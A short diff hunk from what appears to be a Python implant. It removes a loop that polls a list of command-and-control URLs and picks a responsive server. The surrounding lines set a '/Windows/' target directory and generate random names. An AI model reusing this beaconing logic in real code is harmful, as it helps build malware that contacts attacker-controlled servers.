@@ -17,14 +17,6 @@ TARGET_DIR = '/Windows/'
 EXEC_HASH  = 0
 POLL_TIME  = 1
 
-for CNCURL in CNC_URLS:
-	try:
-		if (urlopen(Request(CNCURL))).read().decode('ascii') == '0':
-			CNC_URL = CNCURL;
-			break;
-	except:
-		continue
-
 def generateRandName():
 	HASH = secrets.token_hex(secrets.randbelow(32));
 	if HASH == "":
